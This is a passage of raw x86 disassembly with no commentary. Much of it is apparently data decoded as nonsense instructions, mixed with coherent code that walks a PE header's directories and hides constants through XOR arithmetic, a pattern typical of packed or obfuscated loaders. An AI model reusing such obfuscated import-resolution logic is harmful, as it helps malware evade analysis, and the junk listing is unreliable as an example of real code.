  408de0:	retf   0x9b8b
  408de3:	and    ah,BYTE PTR [edx]
  408de5:	mov    al,ds:0x5f7e2f0e
  408dea:	jp     0x408e4b
  408dec:	outs   dx,BYTE PTR ds:[esi]
  408ded:	pusha  
  408dee:	(bad)  
  408def:	sub    al,0x7d
  408df1:	(bad)  
  408df2:	xor    al,0x7d
  408df4:	and    DWORD PTR [esi+edx*8+0x3e],0x5ea9001
  408dfc:	in     eax,dx
  408dfd:	aad    0x90
  408dff:	aad    0x3b
  408e01:	inc    ebx
  408e02:	push   esi
  408e03:	mov    ds:0x30b0887b,eax
  408e08:	sub    eax,0x5c6baf85
  408e0d:	ret    0x760a
  408e10:	push   eax
  408e11:	leave  
  408e12:	cmp    edi,DWORD PTR [edi]
  408e14:	loopne 0x408e2f
  408e16:	mov    eax,ds:0xdb6e4755
  408e1b:	ins    BYTE PTR es:[edi],dx
  408e1c:	xor    bl,dl
  408e1e:	and    al,dl
  408e20:	add    al,0x5e
  408e22:	push   eax
  408e23:	xlat   BYTE PTR ds:[ebx]
  408e24:	mov    DWORD PTR [edx-0x3ba749a],edx
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x9fd53d50
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	test   al,0x3c
  408ec6:	mov    BYTE PTR [edx-0x6739f02a],dh
  408ecc:	dec    eax
  408ecd:	sahf   
  408ece:	xchg   esi,eax
  408ecf:	sbb    eax,0x58ff76b1
  408ed4:	push   es
  408ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ed6:	fld    DWORD PTR [ecx]
  408ed8:	dec    ecx
  408ed9:	or     cl,bh
  408edb:	sub    BYTE PTR [esp+ebx*8],ch
  408ede:	mov    ah,0xf9
  408ee0:	jle    0x408e6a
  408ee2:	mov    edi,0xbdc42551
  408ee7:	loope  0x408f0c
  408ee9:	imul   ebx,ebx,0xffffffa9
  408eec:	ret    
  408eed:	push   0x44
  408eef:	es rcr edx,1
  408ef2:	jp     0x408ef6
  408ef4:	inc    ebx
  408ef5:	jmp    0xf1eaed0c
  408efa:	out    0x95,al
  408efc:	stc    
  408efd:	cmc    
  408efe:	push   esi
  408eff:	mov    ch,0xf9
  408f01:	fst    DWORD PTR gs:[eax+0x53]
  408f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f07:	pop    ebx
  408f08:	test   DWORD PTR [esi-0x14],esi
  408f0b:	inc    esp
  408f0c:	adc    eax,0x6a26a2d7
  408f11:	xchg   esp,eax
  408f12:	cmp    BYTE PTR [esi],al
  408f14:	pop    ebp
  408f15:	fmulp  st(2),st
  408f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f18:	imul   ebp,DWORD PTR [ebp-0x42],0xffffff89
  408f1c:	xor    BYTE PTR [ebx+0x1],dl
  408f1f:	add    ecx,DWORD PTR [edi+0x5920a0a0]
  408f25:	repz aas 
  408f27:	cli    
  408f28:	or     BYTE PTR [ecx-0x12],cl
  408f2b:	push   ebp
  408f2c:	addr16 pushf 
  408f2e:	ss retf 0xad18
  408f32:	adc    DWORD PTR [esi-0x2d7154ab],0xffffffd4
  408f39:	fs sbb eax,0xde957a73
  408f3f:	nop
  408f40:	ret    
  408f41:	or     al,0x1f
  408f43:	mov    ah,0x70
  408f45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f46:	add    DWORD PTR [ecx-0x2502cd38],0xffffff99
  408f4d:	js     0x408fc0
  408f4f:	add    BYTE PTR ds:0x74303305,0x98
  408f56:	sub    bh,al
  408f58:	pop    ecx
  408f59:	mov    edi,0x94e213a3
  408f5e:	push   edi
  408f5f:	fistp  QWORD PTR [esp+eiz*4-0xc]
  408f63:	loope  0x408f66
  408f65:	inc    eax
  408f66:	pop    ss
  408f67:	pushf  
  408f68:	pop    ebp
  408f69:	fsubr  QWORD PTR [ebx]
  408f6b:	mov    ebp,0xa83824a1
  408f70:	in     eax,0xfa
  408f72:	je     0x408fb2
  408f74:	je     0x408f18
  408f76:	jo     0x408faf
  408f78:	jb     0x408f31
  408f7a:	mov    esp,0xdf050300
  408f7f:	sub    al,0x44
  408f81:	call   0xe3be:0x8d679c87
  408f88:	xchg   ebp,eax
  408f89:	jbe    0x409007
  408f8b:	out    0xa2,al
  408f8d:	add    al,0x77
  408f8f:	retf   0xa983
  408f92:	fld    TBYTE PTR [ebp-0x4c]
  408f95:	dec    DWORD PTR [ebx]
  408f97:	gs mov eax,0xb160930
  408f9d:	xor    al,0x36
  408f9f:	or     DWORD PTR [esi],esi
  408fa1:	test   BYTE PTR [ecx+0x44],dh
  408fa4:	dec    ebx
  408fa5:	mov    ds:0x6ccdf817,al
  408faa:	in     al,0xa9
  408fac:	jmp    0x2ae45420
  408fb1:	sbb    ebx,DWORD PTR [esi]
  408fb3:	lds    edi,FWORD PTR [edi+0x7505a62c]
  408fb9:	or     eax,0xe2be3459
  408fbe:	daa    
  408fbf:	push   eax
  408fc0:	adc    ebx,ecx
  408fc2:	sti    
  408fc3:	enter  0xa40a,0x97
  408fc7:	das    
  408fc8:	fst    QWORD PTR [eax]
  408fca:	int3   
  408fcb:	loopne 0x40901d
  408fcd:	push   edi
  408fce:	int    0x81
  408fd0:	arpl   bx,bx
  408fd2:	push   0x450de5d6
  408fd7:	xchg   DWORD PTR [edx-0x52875c73],edx
  408fdd:	repnz outs dx,DWORD PTR ds:[esi]
  408fdf:	dec    edi
  408fe0:	jnp    0x40900f
  408fe2:	les    eax,FWORD PTR [ecx+edi*2-0x3395cbc9]
  408fe9:	not    BYTE PTR ds:0xa30a59b5
  408fef:	mov    ds:0x5adc5d81,eax
  408ff4:	out    0xad,eax
  408ff6:	out    dx,al
  408ff7:	les    edi,FWORD PTR [ecx+0xd]
  408ffa:	(bad)  
  408ffb:	pop    ebp
  408ffc:	add    eax,0x644843d4
  409001:	(bad)  
  409002:	test   DWORD PTR [edi+0xb],eax
  409005:	and    ebp,DWORD PTR [edx+0x55d25507]
  40900b:	test   dh,cl
  40900d:	je     0x409050
  40900f:	sub    ecx,ecx
  409011:	aam    0x95
  409013:	xchg   ebp,eax
  409014:	adc    ah,BYTE PTR [eax+ecx*1-0x653cb042]
  40901b:	xor    DWORD PTR [eax+eax*8+0x20],esp
  40901f:	mov    ah,0xb0
  409021:	aad    0x5f
  409023:	mov    dh,0xa2
  409025:	add    DWORD PTR [ecx],ebx
  409027:	mov    dl,0xd9
  409029:	sbb    al,0xc3
  40902b:	out    dx,al
  40902c:	xchg   ebx,eax
  40902d:	mov    esp,0x163c8db
  409032:	popa   
  409033:	les    ebx,FWORD PTR [edi-0x68]
  409036:	inc    eax
  409037:	pop    ebx
  409038:	aam    0xa6
  40903a:	or     DWORD PTR [ebp+ebp*4-0x33],ebx
  40903e:	xlat   BYTE PTR ds:[ebx]
  40903f:	mov    DWORD PTR [edi+eax*8+0x23],ebp
  409043:	icebp  
  409044:	sbb    WORD PTR [ecx+0x66701e9e],sp
  40904b:	xor    DWORD PTR [esi+eiz*2+0xe],0x67
  409050:	cli    
  409051:	sub    al,0xaf
  409053:	test   ecx,0xca5a767d
  409059:	pop    ebp
  40905a:	in     al,dx
  40905b:	(bad)  
  40905c:	loopne 0x409055
  40905e:	adc    eax,0xb21341aa
  409063:	outs   dx,DWORD PTR ds:[esi]
  409064:	adc    dl,bl
  409066:	pop    edx
  409067:	jns    0x408ff5
  409069:	icebp  
  40906a:	pop    ds
  40906b:	and    esi,DWORD PTR ds:0x3ac17e9f
  409071:	xchg   ecx,eax
  409072:	retf   
  409073:	in     eax,dx
  409074:	jl     0x4090c5
  409076:	enter  0x223f,0x7d
  40907a:	mov    ch,0x37
  40907c:	(bad)  
  40907d:	sbb    al,0xca
  40907f:	gs aad 0xbf
  409082:	adc    cl,dh
  409084:	jae    0x409068
  409086:	retf   0x2b3c
  409089:	fstp   QWORD PTR [ebx]
  40908b:	das    
  40908c:	inc    ecx
  40908d:	stos   BYTE PTR es:[edi],al
  40908e:	xchg   ebx,eax
  40908f:	jae    0x409108
  409091:	test   BYTE PTR [esi-0x116e91c5],bl
  409097:	and    ch,BYTE PTR [edi+ecx*4+0x61]
  40909b:	mov    ah,0xb3
  40909d:	add    al,0x3
  40909f:	mov    dh,0x10
  4090a1:	xchg   esp,eax
  4090a2:	cmc    
  4090a3:	cmp    DWORD PTR [esi-0x7],edi
  4090a6:	aas    
  4090a7:	imul   edx,DWORD PTR [ebx-0x5d],0x37
  4090ab:	fisub  WORD PTR [eax+eiz*4-0xba6154e]
  4090b2:	call   0x9f2759c8
  4090b7:	sbb    BYTE PTR [ecx+0x14f5eebb],dh
  4090bd:	dec    eax
  4090be:	mov    cl,0xac
  4090c0:	or     BYTE PTR [ecx+0x4d22a32e],dh
  4090c6:	inc    BYTE PTR [edi+0x24]
  4090c9:	xor    ecx,DWORD PTR [edi+0x33]
  4090cc:	add    eax,0xe00df2d6
  4090d1:	xor    al,0xe8
  4090d3:	outs   dx,BYTE PTR ds:[esi]
  4090d4:	mov    cl,0xf6
  4090d6:	pop    edx
  4090d7:	or     eax,DWORD PTR [ecx]
  4090d9:	pop    ecx
  4090da:	repz mov edi,0x97dcca20
  4090e0:	jo     0x409143
  4090e2:	(bad)  
  4090e3:	and    al,0x68
  4090e5:	dec    esp
  4090e6:	sub    al,0x5
  4090e8:	add    esi,DWORD PTR [esp+eax*1+0x16]
  4090ec:	out    0xd3,eax
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xff
  409163:	jnp    0x40915d
  409165:	mov    esi,0x7e7edf32
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	pop    esi
  40916f:	xchg   DWORD PTR [edx+0x77132289],eax
  409175:	and    esi,esp
  409177:	push   eax
  409178:	cmp    eax,0xd06fd5d4
  40917d:	or     al,0xa1
  40917f:	inc    ebp
  409180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409181:	cmp    bl,BYTE PTR ds:0x68756fe5
  409187:	sbb    DWORD PTR [edi],edx
  409189:	mov    esp,DWORD PTR [edx+0x2c2b1df]
  40918f:	int    0x4c
  409191:	dec    edi
  409192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409193:	lahf   
  409194:	(bad)  
  409195:	push   eax
  409196:	xor    ch,BYTE PTR [ebx+0x11]
  409199:	fistp  QWORD PTR [edx+eax*1]
  40919c:	xor    eax,0xc29ffa3a
  4091a1:	rcr    BYTE PTR [edi+0xa],cl
  4091a4:	jecxz  0x4091a4
  4091a6:	ret    
  4091a7:	(bad)  
  4091a8:	mov    esi,0x691f247b
  4091ad:	xor    eax,0xd0bc38e6
  4091b2:	and    cl,BYTE PTR [esi]
  4091b4:	ret    0x4458
  4091b7:	enter  0xcd80,0x29
  4091bb:	mov    ch,0x9b
  4091bd:	inc    ebp
  4091be:	pop    esp
  4091bf:	jmp    0x179e:0x5cca819
  4091c6:	mov    bl,0x52
  4091c8:	mov    esp,0xb0a0c5cb
  4091cd:	lds    eax,FWORD PTR [edx+0x2919dd7c]
  4091d3:	adc    al,0xf1
  4091d5:	mov    ebx,0x1909fa2b
  4091da:	xor    dh,bh
  4091dc:	sub    eax,0x35ab3fec
  4091e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091e2:	adc    edi,DWORD PTR [esp+esi*2-0x11]
  4091e6:	jnp    0x4091bf
  4091e8:	sub    eax,0x153354fb
  4091ed:	or     DWORD PTR [ebp-0x4e],edi
  4091f0:	pcmpeqb mm6,QWORD PTR [edx]
  4091f3:	jg     0x40923c
  4091f5:	data16 jnp 0x4091fe
  4091f8:	push   esp
  4091f9:	out    0xe3,eax
  4091fb:	fild   DWORD PTR [ebp-0x79f9ed94]
  409201:	and    ebp,DWORD PTR [edx+edx*1-0xaf9115a]
  409208:	dec    ebx
  409209:	jnp    0x4091b3
  40920b:	jle    0x4091a3
  40920d:	aad    0xda
  40920f:	call   FWORD PTR [edx-0x55]
  409212:	retf   
  409213:	sub    eax,0xc8906798
  409218:	hlt    
  409219:	and    BYTE PTR [ebx-0x21],0x30
  40921d:	dec    ebp
  40921e:	or     BYTE PTR [ecx+0x71],ch
  409221:	stos   DWORD PTR es:[edi],eax
  409222:	dec    esi
  409223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409224:	adc    eax,0x968db5cd
  409229:	cwde   
  40922a:	xlat   BYTE PTR ds:[ebx]
  40922b:	mov    esi,0xe095600
  409230:	jb     0x409247
  409232:	int    0xfb
  409234:	push   eax
  409235:	(bad)  
  409236:	retf   
  409237:	fwait
  409238:	mov    bl,0x24
  40923a:	imul   edx,DWORD PTR [edx],0xe7493ce
  409240:	or     edx,DWORD PTR [eax-0x6ffcc7b4]
  409246:	push   ebp
  409247:	xchg   ebp,eax
  409248:	fisttp WORD PTR [ecx+0x21741d5e]
  40924e:	push   es
  40924f:	adc    eax,0xa1c72930
  409254:	adc    eax,0x8cac0c69
  409259:	cmp    BYTE PTR [ebx],ch
  40925b:	lods   al,BYTE PTR ds:[esi]
  40925c:	test   DWORD PTR [edx],ebp
  40925e:	retf   0x5d2
  409261:	mov    bh,0xbb
  409263:	neg    BYTE PTR ds:0xab39d809
  409269:	mov    bl,BYTE PTR [ebx]
  40926b:	stc    
  40926c:	and    eax,0x2e009167
  409271:	dec    ebp
  409272:	fdivr  QWORD PTR [ebx+0x48c1c65e]
  409278:	pop    ebp
  409279:	jmp    0xa00898f1
  40927e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40927f:	jnp    0x409240
  409281:	loopne 0x4092cb
  409283:	add    ebx,DWORD PTR ds:0xe65de0d6
  409289:	sbb    edi,DWORD PTR [bp+si-0x6d]
  40928d:	ret    0xf6a4
  409290:	jne    0x409228
  409292:	mov    eax,ds:0x206f78b5
  409297:	(bad)  
  409298:	fdiv   st(6),st
  40929a:	inc    edi
  40929b:	cmp    DWORD PTR fs:[esi+edx*8],ebp
  40929f:	fdivrp st(1),st
  4092a1:	into   
  4092a2:	xchg   BYTE PTR [esi+0x5e2270f7],bh
  4092a8:	adc    al,0xa
  4092aa:	sub    BYTE PTR [edi],al
  4092ac:	sahf   
  4092ad:	xchg   edx,eax
  4092ae:	mov    esi,DWORD PTR [edx]
  4092b0:	test   eax,0xb54f01c7
  4092b5:	sti    
  4092b6:	int    0x4e
  4092b8:	xchg   edx,eax
  4092b9:	and    eax,esp
  4092bb:	add    eax,0xa41b7e2
  4092c0:	ds xchg edi,eax
  4092c2:	sub    eax,0xe028f28f
  4092c7:	outs   dx,DWORD PTR ds:[esi]
  4092c8:	pop    esi
  4092c9:	hlt    
  4092ca:	ss int3 
  4092cc:	outs   dx,DWORD PTR ds:[esi]
  4092cd:	push   ss
  4092ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092cf:	push   ds
  4092d0:	call   0x8bee4ed2
  4092d5:	lods   eax,DWORD PTR ds:[esi]
  4092d6:	cmp    ah,BYTE PTR [eax]
  4092d8:	(bad)  
  4092d9:	test   dl,ch
  4092db:	cmp    al,0x6b
  4092dd:	pop    edi
  4092de:	outs   dx,BYTE PTR ds:[esi]
  4092df:	div    DWORD PTR [esi-0x53]
  4092e2:	mov    dh,0xf8
  4092e4:	pop    edx
  4092e5:	mov    ds:0xc469a9cd,eax
  4092ea:	inc    eax
  4092eb:	push   0x30
  4092ed:	sub    eax,edx
  4092ef:	jne    0x4092e5
  4092f1:	sbb    DWORD PTR [esp+eiz*8-0x2aa03a2c],ebx
  4092f8:	add    al,0xef
  4092fa:	dec    eax
  4092fb:	repnz test eax,0x78cb7ecf
  409301:	popa   
  409302:	push   ds
  409303:	sbb    BYTE PTR [ebx+0x64a2b64],0xe7
  40930a:	sub    eax,0x81e1ac50
  40930f:	dec    esp
  409310:	mov    esi,0x36e27a8f
  409315:	xor    ch,BYTE PTR [edi+0x36]
  409318:	popf   
  409319:	(bad)  
  40931a:	push   ds
  40931b:	fmul   st,st(0)
  40931d:	cs jbe 0x409374
  409320:	or     al,dl
  409322:	cld    
  409323:	outs   dx,BYTE PTR ds:[esi]
  409324:	ror    BYTE PTR [ebx-0x6e],1
  409327:	push   eax
  409328:	inc    esi
  409329:	retf   
  40932a:	push   0x34
  40932c:	pop    edi
  40932d:	sub    ebp,DWORD PTR [ecx-0x17]
  409330:	cld    
  409331:	pop    ebp
  409332:	and    BYTE PTR [esi+0x4f],cl
  409335:	or     ebp,DWORD PTR [edx+0x194ef744]
  40933b:	jns    0x409327
  40933d:	jae    0x4092c5
  40933f:	cmp    BYTE PTR [eax],ch
  409341:	(bad)  
  409342:	mov    dl,0x93
  409344:	repnz daa 
  409346:	loope  0x409368
  409348:	cmp    cl,BYTE PTR [ecx-0x6b]
  40934b:	push   cs
  40934c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40934d:	lock je 0x4093bd
  409350:	iret   
  409351:	dec    eax
  409352:	jp     0x4092fb
  409354:	add    ch,BYTE PTR fs:[ecx+0x5c]
  409358:	jmp    0x2f:0xe5aec4d9
  40935f:	test   al,0xc5
  409361:	in     eax,0xe0
  409363:	mov    esp,0x9b921e6e
  409368:	pop    es
  409369:	add    eax,0x9942851c
  40936e:	fld    TBYTE PTR [ecx]
  409370:	xor    BYTE PTR [eax-0x2a],bl
  409373:	outs   dx,DWORD PTR ds:[esi]
  409374:	ins    BYTE PTR es:[edi],dx
  409375:	outs   dx,BYTE PTR ds:[esi]
  409376:	or     ecx,DWORD PTR [edx]
  409378:	mov    eax,0x2992c365
  40937d:	into   
  40937e:	mov    bl,0x11
  409380:	(bad)  
  409381:	jb     0x4093e2
  409383:	mov    al,ds:0x5f2d3dc
  409388:	rcl    dh,1
  40938a:	dec    ebp
  40938b:	cmp    DWORD PTR [ebp+0x13],eax
  40938e:	push   es
  40938f:	out    dx,al
  409390:	sub    eax,0x6301b0c8
  409395:	mov    cl,0x84
  409397:	mov    bl,0x89
  409399:	or     BYTE PTR [ebx+0x458b0c45],cl
  40939f:	or     bh,bh
  4093a1:	jne    0x40939b
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	lods   al,BYTE PTR ds:[esi]
  4093b5:	sub    al,0x7
  4093b7:	(bad)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	mov    dl,0xa9
  4093c2:	jle    0x409356
  4093c4:	jmp    0x9aa8:0xb1640d8b
  4093cb:	mov    ds:0x62dfc985,eax
  4093d0:	loope  0x40940c
  4093d2:	loopne 0x4093dd
  4093d4:	mov    ebx,0x2801b5d6
  4093d9:	jb     0x4093d8
  4093db:	data16 jle 0x40936f
  4093de:	jle    0x409459
  4093e0:	outs   dx,DWORD PTR ds:[esi]
  4093e1:	jns    0x409396
  4093e3:	dec    esi
  4093e4:	mov    ds:0xed3328d3,eax
  4093e9:	aaa    
  4093ea:	ret    
  4093eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ec:	sbb    bh,BYTE PTR [edi+edx*8-0x4bd7733d]
  4093f3:	out    dx,eax
  4093f4:	out    0x51,al
  4093f6:	(bad)  
  4093f7:	rcr    DWORD PTR [esi-0x45513aca],cl
  4093fd:	sub    esp,DWORD PTR [ecx+edi*1]
  409400:	stos   DWORD PTR es:[edi],eax
  409401:	pop    eax
  409402:	xsha1  (bad)
  409403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409404:	mov    bh,BYTE PTR [edx+eax*1-0x7418224a]
  40940b:	xlat   BYTE PTR ds:[ebx]
  40940c:	sbb    al,0x7d
  40940e:	jns    0x4093a4
  409410:	out    dx,eax
  409411:	jecxz  0x4093df
  409413:	or     esp,eax
  409415:	mov    cl,0xea
  409417:	xchg   esi,eax
  409418:	imul   edx,ebp,0xfdac438f
  40941e:	or     eax,esi
  409420:	adc    al,0xdb
  409422:	icebp  
  409423:	pop    ds
  409424:	(bad)  
  409425:	jmp    0x4093f1
  409427:	xor    eax,0x2c38a1e0
  40942c:	pop    es
  40942d:	and    bh,BYTE PTR [ebp+0xcdab4e0]
  409433:	test   dh,ah
  409435:	cli    
  409436:	or     ch,BYTE PTR [esi+0x11f06dce]
  40943c:	sbb    ecx,DWORD PTR [esi+edi*8+0x14]
  409440:	xor    al,0xc2
  409442:	dec    esp
  409443:	push   cs
  409444:	lods   al,BYTE PTR ds:[esi]
  409445:	add    DWORD PTR [ecx+0x6b2978d3],0x1e5213a4
  40944f:	pop    edx
  409450:	cs (bad) 
  409452:	mov    edi,0x291977a1
  409457:	and    ch,BYTE PTR [esi+ebp*2]
  40945a:	pop    ebp
  40945b:	rcl    dh,cl
  40945d:	mov    esp,0xb2842721
  409462:	mov    WORD PTR [si+0x4dfb],gs
  409467:	shr    BYTE PTR [esi+0x5c],cl
  40946a:	fwait
  40946b:	mov    bl,0x11
  40946d:	and    dh,BYTE PTR [edx-0x35]
  409470:	out    dx,eax
  409471:	loop   0x4094ac
  409473:	adc    BYTE PTR [edx+0x59],0xdb
  409477:	mov    ebp,0x3c17c29
  40947c:	call   DWORD PTR [ecx-0x61]
  40947f:	sbb    esi,ebp
  409481:	call   0x6761d1a
  409486:	xor    DWORD PTR [edx+0x3],esp
  409489:	mov    DWORD PTR [edi],eax
  40948b:	mov    ah,0x45
  40948d:	add    DWORD PTR [ecx-0x2f],eax
  409490:	fdivr  DWORD PTR [esi+0xa]
  409493:	pop    esi
  409494:	xor    BYTE PTR [esi],0xf3
  409497:	xlat   BYTE PTR ds:[ebx]
  409498:	xchg   ebp,eax
  409499:	sbb    eax,0x4807d1ba
  40949e:	push   edx
  40949f:	out    dx,eax
  4094a0:	mov    ah,0xea
  4094a2:	mov    ecx,0xd6bd7d30
  4094a7:	inc    esp
  4094a8:	sbb    al,0x3d
  4094aa:	or     esp,esp
  4094ac:	jne    0x409498
  4094ae:	cwde   
  4094af:	sub    dl,BYTE PTR [ebx+0x5753ef60]
  4094b5:	mov    eax,0x4c49a716
  4094ba:	aaa    
  4094bb:	pop    ebx
  4094bc:	jp     0x409474
  4094be:	pop    ecx
  4094bf:	leave  
  4094c0:	(bad)  
  4094c1:	adc    BYTE PTR [ebx-0x29],bl
  4094c4:	jl     0x4094fa
  4094c6:	retf   
  4094c7:	out    dx,al
  4094c8:	into   
  4094c9:	cmc    
  4094ca:	add    al,BYTE PTR [ebx+eax*8+0x6d2f4755]
  4094d1:	mov    ch,0x67
  4094d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094d4:	jmp    0x2257f8a9
  4094d9:	fiadd  DWORD PTR [edx-0x22e6d8a2]
  4094df:	push   esi
  4094e0:	ret    
  4094e1:	sub    edi,DWORD PTR [ebx+0x5b]
  4094e4:	fs int3 
  4094e6:	mov    dl,0x60
  4094e8:	push   ecx
  4094e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094ea:	pop    esi
  4094eb:	pop    esp
  4094ec:	jne    0x4094a4
  4094ee:	dec    edx
  4094ef:	cmp    DWORD PTR [esi+0x54],ebx
  4094f2:	jns    0x409570
  4094f4:	adc    al,BYTE PTR [esi-0x68]
  4094f7:	xchg   ecx,eax
  4094f8:	dec    edi
  4094f9:	mov    dh,0xd4
  4094fb:	push   ebp
  4094fc:	loope  0x409538
  4094fe:	pop    ecx
  4094ff:	ds scas eax,DWORD PTR es:[edi]
  409501:	add    DWORD PTR [ecx+0x3bbaee2f],edi
  409507:	sbb    DWORD PTR [edi-0x6c],eax
  40950a:	push   0xd7d5486c
  40950f:	mov    BYTE PTR [ebp*2+0x2454bb81],cl
  409516:	sub    eax,0xf85e7e0c
  40951b:	popa   
  40951c:	outs   dx,BYTE PTR ds:[esi]
  40951d:	pop    ebx
  40951e:	mov    ch,BYTE PTR [ecx+ebx*4-0x56]
  409522:	push   edx
  409523:	push   edi
  409524:	mov    ds:0xb17dab3a,al
  409529:	push   0xff3a3ec5
  40952e:	mov    ecx,0x56ea0538
  409533:	or     eax,0x904ad68b
  409538:	mov    eax,ds:0x4f101c9c
  40953d:	mov    esi,0xa5bc3ab3
  409542:	cmp    BYTE PTR [ecx],dl
  409544:	int    0x9a
  409546:	fucompp 
  409548:	out    0xc8,eax
  40954a:	cmp    eax,0x6358d6c3
  40954f:	retf   0xc970
  409552:	stos   BYTE PTR es:[edi],al
  409553:	xlat   BYTE PTR ds:[ebx]
  409554:	push   ecx
  409555:	or     eax,0x9183ae4d
  40955a:	lea    esi,[eax-0x80]
  40955d:	inc    ecx
  40955e:	cs push edx
  409560:	lahf   
  409561:	mov    ch,0x58
  409563:	push   ebx
  409564:	xchg   ecx,eax
  409565:	cdq    
  409566:	add    BYTE PTR [edi+0x186dca5b],al
  40956c:	mov    al,0x63
  40956e:	mov    esp,0x7644c3a7
  409573:	or     DWORD PTR [ebx],ebp
  409575:	pop    ebx
  409576:	pop    edi
  409577:	inc    esi
  409578:	xor    al,0xc9
  40957a:	cld    
  40957b:	add    BYTE PTR [eax-0x26e2c0e],ch
  409581:	cmp    DWORD PTR [ebp-0x58],edx
  409584:	cmp    eax,0xab448654
  409589:	sar    dh,0x88
  40958c:	cdq    
  40958d:	aad    0x7c
  40958f:	add    ch,BYTE PTR [esi]
  409591:	mov    cl,0x9b
  409593:	sbb    DWORD PTR [ebp-0x5ba35e0],ecx
  409599:	xor    dh,al
  40959b:	jne    0x409533
  40959d:	pop    edx
  40959e:	and    al,BYTE PTR [ecx+0x712ab56]
  4095a4:	pusha  
  4095a5:	lds    esp,FWORD PTR [esi]
  4095a7:	sub    dl,BYTE PTR [ebp-0x78c8bea]
  4095ad:	cld    
  4095ae:	and    edi,DWORD PTR [ebp+0x17415417]
  4095b4:	lds    esi,FWORD PTR [ebx]
  4095b6:	dec    esi
  4095b7:	or     BYTE PTR [edx+ebp*8],dh
  4095ba:	and    DWORD PTR [edi+ecx*4],ecx
